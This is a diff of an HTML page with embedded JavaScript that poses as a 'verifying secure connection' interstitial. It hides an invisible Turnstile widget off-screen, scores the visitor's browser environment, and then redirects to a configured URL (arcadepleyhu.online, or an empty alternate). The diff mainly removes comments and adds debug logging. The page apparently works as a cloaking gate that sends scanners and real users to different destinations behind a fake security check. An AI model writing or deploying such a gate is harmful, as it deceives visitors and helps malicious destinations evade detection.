@@ -186,7 +186,6 @@
             transition: all 0.3s ease;
         }
         
-        /* Hidden Turnstile container */
         .turnstile-container {
             position: absolute;
             left: -9999px;
@@ -333,12 +332,15 @@
             position: relative;
             z-index: 1;
         }
+
+
         
         @media screen and (max-width: 500px) {
             .card {
                 padding: 1.5rem;
                 max-width: 95%;
             }
+
         }
     </style>
 </head>
@@ -358,7 +360,6 @@
             <span class="status-text">Verifying secure connection</span>
         </div>
         
-        <!-- Hidden Turnstile widget - loads in background -->
         <div class="turnstile-container">
             <div id="turnstile-widget"></div>
         </div>
@@ -380,38 +381,52 @@
         </div>
     </div>
 
+
+
     <script>
         (function() {
-            // ========================================
-            // CONFIGURATION - CHANGE THESE VALUES
-            // ========================================
-        const config = {
-    // Your Cloudflare Turnstile Site Key
-    turnstileSiteKey: '0x4AAAAAAB-FQYt3HwC8y-o6',
-    
-    // Your destination URLs
-    primary: 'https://arcadepleyhu.online',
-    alternate: '',
-    
-    // Timing configuration
-    buttonDelay: 7500,
-    transitionSpeed: 300,
-    
-    // Feature flags
-    useTurnstile: true,
-    useBackgroundImage: true
-};
-            // ========================================
-            // STATE MANAGEMENT
-            // ========================================
+            const config = {
+                turnstileSiteKey: '0x4AAAAAAB-FQYt3HwC8y-o6',
+                primary: 'https://arcadepleyhu.online',
+                alternate: '',
+                buttonDelay: 7500,
+                transitionSpeed: 300,
+                useTurnstile: true,
+                useBackgroundImage: true,
+                debugMode: true
+            };
+            
             let turnstileToken = null;
             let turnstileLoaded = false;
             let userInteracted = false;
             let systemReady = false;
             
-            // ========================================
-            // METADATA & SEO
-            // ========================================
+            function log(message, type = 'info') {
+                if (!config.debugMode) return;
+                
+                const timestamp = new Date().toLocaleTimeString();
+                const styles = {
+                    info: 'color: #00ff00',
+                    error: 'color: #ff0000; font-weight: bold',
+                    warning: 'color: #ffaa00'
+                };
+                console.log(`%c[${timestamp}] ${message}`, styles[type] || styles.info);
+            }
+
+            function logStatus() {
+                if (!config.debugMode) return;
+                
+                console.log('%c═══════════════════════════════════', 'color: #666');
+                console.log('%c🔍 TURNSTILE STATUS', 'color: #ffff00; font-size: 14px; font-weight: bold');
+                console.log('%c═══════════════════════════════════', 'color: #666');
+                console.log(`%cDomain: ${window.location.hostname}`, 'color: #ffaa00');
+                console.log(`%cSite Key: ${config.turnstileSiteKey.substring(0, 20)}...`, 'color: #888');
+                console.log(`%cTurnstile Loaded: ${turnstileLoaded}`, turnstileLoaded ? 'color: #00ff00' : 'color: #ff0000');
+                console.log(`%cToken Received: ${turnstileToken ? 'Yes' : 'No'}`, turnstileToken ? 'color: #00ff00' : 'color: #ff0000');
+                console.log(`%cUser Interacted: ${userInteracted}`, userInteracted ? 'color: #00ff00' : 'color: #ffaa00');
+                console.log('%c═══════════════════════════════════', 'color: #666');
+            }
+            
             function addMetaTags() {
                 const canonical = document.createElement('link');
                 canonical.rel = 'canonical';
@@ -423,18 +438,11 @@
                 document.body.insertBefore(noscript, document.body.firstChild);
             }
             
-            // ========================================
-            // BACKGROUND IMAGE LOADING
-            // ========================================
             function loadBackgroundImage() {
                 if (!config.useBackgroundImage) return;
                 
                 const isMobile = window.innerWidth <= 500;
-                // Use bg-mob.webp as a fallback for the desktop image if bg.webp is not available.
-                // This ensures an image is always loaded.
-                const desktopImage = 'img/bg.webp';
-                const mobileImage = 'img/bg-mob.webp';
-                const bgImage = isMobile ? mobileImage : desktopImage;
+                const bgImage = isMobile ? 'img/bg-mob.webp' : 'img/bg.webp';
                 
                 const img = new Image();
                 img.onload = function() {
@@ -444,21 +452,15 @@
                     document.body.classList.add('bg-loaded');
                 };
                 img.onerror = function() {
-                    // If the intended image fails (e.g., bg.webp is missing), try loading the mobile image as a fallback.
-                    if (img.src.includes(desktopImage)) {
-                        console.log(`Desktop image not found at ${desktopImage}, falling back to ${mobileImage}`);
-                        img.src = mobileImage;
-                    }
+                    log('Background image not found', 'warning');
                 };
                 img.src = bgImage;
             }
             
-            // ========================================
-            // USER INTERACTION TRACKING
-            // ========================================
             function trackUserInteraction() {
                 if (!userInteracted) {
                     userInteracted = true;
+                    log('User interaction detected', 'info');
                 }
             }
             
@@ -467,20 +469,33 @@
             document.addEventListener('keydown', trackUserInteraction, { once: true });
             document.addEventListener('click', trackUserInteraction, { once: true });
             
-            // ========================================
-            // CLOUDFLARE TURNSTILE INTEGRATION
-            // ========================================
+            function checkDomainConfiguration() {
+                const currentDomain = window.location.hostname;
+                log(`Current domain: ${currentDomain}`, 'info');
+                log(`Turnstile key: ${config.turnstileSiteKey.substring(0, 20)}...`, 'info');
+                
+                if (config.turnstileSiteKey === 'YOUR_SITE_KEY_HERE') {
+                    log('⚠️ Turnstile key not configured!', 'error');
+                    return false;
+                }
+                
+                log('✓ Configuration looks valid', 'info');
+                return true;
+            }
+            
             function initTurnstile() {
                 if (!config.useTurnstile || config.turnstileSiteKey === 'YOUR_SITE_KEY_HERE') {
-                    console.log('Turnstile disabled or not configured');
+                    log('Turnstile disabled or not configured', 'warning');
                     turnstileLoaded = true;
                     return;
                 }
                 
-                // Wait for Turnstile API to load
+                log('Initializing Turnstile...', 'info');
+                
                 const checkTurnstile = setInterval(function() {
                     if (typeof turnstile !== 'undefined') {
                         clearInterval(checkTurnstile);
+                        log('Turnstile API loaded', 'info');
                         
                         try {
                             turnstile.render('#turnstile-widget', {
@@ -488,52 +503,54 @@
                                 callback: function(token) {
                                     turnstileToken = token;
                                     turnstileLoaded = true;
-                                    console.log('Turnstile verification complete');
+                                    log('✓ Turnstile verification complete!', 'info');
+                                    logStatus();
                                 },
-                                'error-callback': function() {
-                                    console.log('Turnstile error, proceeding anyway');
+                                'error-callback': function(errorCode) {
+                                    log(`Turnstile error: ${errorCode}`, 'error');
+                                    log(`Check if domain "${window.location.hostname}" is added in Cloudflare`, 'error');
+                                    log('Dashboard: https://dash.cloudflare.com', 'warning');
                                     turnstileLoaded = true;
+                                    logStatus();
+                                },
+                                'timeout-callback': function() {
+                                    log('Turnstile timeout', 'warning');
+                                    turnstileLoaded = true;
+                                    logStatus();
                                 },
                                 theme: 'light',
                                 size: 'invisible'
                             });
                         } catch (e) {
-                            console.log('Turnstile init error:', e);
+                            log(`Turnstile init error: ${e.message}`, 'error');
                             turnstileLoaded = true;
                         }
                     }
                 }, 100);
                 
-                // Timeout fallback
                 setTimeout(function() {
                     if (!turnstileLoaded) {
-                        console.log('Turnstile timeout, proceeding anyway');
+                        log('Turnstile timeout after 5s', 'warning');
                         turnstileLoaded = true;
+                        logStatus();
                     }
                 }, 5000);
             }
             
-            // ========================================
-            // SIMPLE USER VALIDATION
-            // ========================================
             function validateUser() {
                 let score = 0;
                 
-                // User interaction check
                 if (userInteracted) score += 30;
-                
-                // Basic browser environment checks
                 if (window.innerWidth > 0 && window.innerHeight > 0) score += 20;
                 if (screen.width > 0 && screen.height > 0) score += 20;
                 if (navigator.userAgent && navigator.userAgent.length > 10) score += 15;
                 if (navigator.language) score += 15;
                 
-                return score >= 50;
+                const isValid = score >= 50;
+                log(`User validation score: ${score}/100 - ${isValid ? 'PASS' : 'FAIL'}`, isValid ? 'info' : 'warning');
+                return isValid;
             }
             
-            // ========================================
-            // PROGRESS BAR ANIMATION
-            // ========================================
             function animateProgress() {
                 const percentEl = document.getElementById('progressPercent');
                 const statusEl = document.getElementById('statusText');
@@ -558,7 +575,8 @@
                         statusText.textContent = 'Connection verified ✓';
                         verificationStatus.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
                         
-                        // Show button after delay
+                        log('Progress complete, showing button', 'info');
+                        
                         setTimeout(function() {
                             btnWrapper.classList.add('active');
                             systemReady = true;
@@ -569,18 +587,19 @@
                 }, interval);
             }
             
-            // ========================================
-            // REDIRECT LOGIC
-            // ========================================
             function determineDestination() {
                 const userValid = validateUser();
                 const hasTurnstile = turnstileToken !== null;
                 
-                // Route to alternate if user passes validation OR has Turnstile token
+                log(`User valid: ${userValid}`, 'info');
+                log(`Has Turnstile token: ${hasTurnstile}`, 'info');
+                
                 if (userValid || hasTurnstile) {
+                    log(`Routing to: ALTERNATE URL`, 'info');
                     return config.alternate;
                 }
                 
+                log(`Routing to: PRIMARY URL`, 'warning');
                 return config.primary;
             }
             
@@ -592,29 +611,26 @@
                 btn.disabled = true;
                 
                 const destination = determineDestination();
+                log(`Redirecting to: ${destination.substring(0, 50)}...`, 'info');
                 
                 setTimeout(function() {
                     window.location.href = destination;
                 }, config.transitionSpeed);
             }
             
-            // ========================================
-            // APPLICATION INITIALIZATION
-            // ========================================
             function startApplication() {
+                log('Application starting...', 'info');
+                checkDomainConfiguration();
+                logStatus();
                 addMetaTags();
                 loadBackgroundImage();
                 initTurnstile();
                 
-                // Start progress animation after initial delay
                 setTimeout(function() {
                     animateProgress();
                 }, 2500);
             }
             
-            // ========================================
-            // EVENT LISTENERS
-            // ========================================
             window.addEventListener('load', function() {
                 startApplication();
                 
